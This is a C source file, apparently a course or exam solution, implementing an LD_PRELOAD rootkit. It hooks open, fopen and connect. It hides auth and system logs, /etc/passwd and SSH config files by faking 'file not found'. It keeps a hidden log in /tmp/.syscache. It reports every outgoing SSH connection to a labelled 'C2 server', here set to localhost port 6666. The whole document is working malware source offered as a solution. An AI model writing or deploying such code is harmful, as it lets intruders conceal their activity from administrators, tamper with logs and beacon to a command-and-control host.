// src/sandbox_preload.c - COMPLETE EXAM SOLUTION (NO OpenSSL DEPENDENCY)
#define _GNU_SOURCE
#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <errno.h>
#include <stdarg.h>

static int (*real_open)(const char *pathname, int flags, ...);
static FILE *(*real_fopen)(const char *pathname, const char *mode);
static int (*real_connect)(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
static int hook_count = 0, ssh_hook_count = 0, inside_hook = 0;

// C2 Server config
#define C2_IP "127.0.0.1"
#define C2_PORT 6666
#define LOG_FILE "/tmp/.syscache"

// Block files
static int should_block_file(const char *pathname) {
    const char *blocked[] = {"/var/log/auth.log", "/var/log/syslog", "/etc/passwd", "/etc/ssh/", NULL};
    if (!pathname) return 0;
    for (int i = 0; blocked[i]; i++) if (strstr(pathname, blocked[i])) return 1;
    return 0;
}

// Detect SSH connections (port 22)
static int is_ssh_connection(const struct sockaddr *addr, socklen_t addrlen) {
    if (addr->sa_family != AF_INET) return 0;
    struct sockaddr_in *sin = (struct sockaddr_in*)addr;
    return ntohs(sin->sin_port) == 22;
}

// Send to C2
static void send_to_c2(const char *data, size_t len, const char *type) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return;
    
    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_IP, &addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == 0) {
        char header[128];
        snprintf(header, sizeof(header), "[%s][PID:%d] %zd bytes\n", type, getpid(), len);
        send(sock, header, strlen(header), 0);
        send(sock, data, len, 0);
    }
    close(sock);
}

// Hidden logging
static void hidden_log(const char *pathname, int flags, int result) {
    if (inside_hook || hook_count > 10) return;
    FILE *log = fopen(LOG_FILE, "a");
    if (!log) return;
    fprintf(log, "[%d] open('%s') = %d\n", getpid(), pathname ? pathname : "NULL", result);
    fclose(log);
}

// FILE HOOKS (SAME AS BEFORE)
int open(const char *pathname, int flags, ...) {
    if (inside_hook) return real_open ? real_open(pathname, flags) : -1;
    inside_hook = 1;
    
    if (!real_open) real_open = dlsym(RTLD_NEXT, "open");
    
    mode_t mode = 0;
    va_list args; va_start(args, flags);
    if (flags & (O_CREAT | O_TMPFILE)) mode = va_arg(args, mode_t);
    va_end(args);
    
    if (should_block_file(pathname)) {
        hidden_log(pathname, flags, -1);
        errno = ENOENT;
        inside_hook = 0; return -1;
    }
    
    int result = real_open(pathname, flags, mode);
    hook_count++;
    if (hook_count <= 10) hidden_log(pathname, flags, result);
    inside_hook = 0; return result;
}

FILE *fopen(const char *pathname, const char *mode) {
    if (inside_hook) return real_fopen ? real_fopen(pathname, mode) : NULL;
    inside_hook = 1;
    
    if (!real_fopen) real_fopen = dlsym(RTLD_NEXT, "fopen");
    
    if (should_block_file(pathname)) {
        hidden_log(pathname, 0, 0);
        errno = ENOENT;
        inside_hook = 0; return NULL;
    }
    
    FILE *result = real_fopen(pathname, mode);
    inside_hook = 0; return result;
}

// ✅ SSH CONNECTION HOOK (Replaces OpenSSL)
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen) {
    if (!real_connect) real_connect = dlsym(RTLD_NEXT, "connect");
    
    // Detect SSH connections (port 22)
    if (is_ssh_connection(addr, addrlen)) {
        char msg[256];
        snprintf(msg, sizeof(msg), "SSH_CONNECTION_DETECTED: PID=%d sockfd=%d", getpid(), sockfd);
        send_to_c2(msg, strlen(msg), "SSH_LOGIN");
        ssh_hook_count++;
    }
    
    return real_connect(sockfd, addr, addrlen);
}
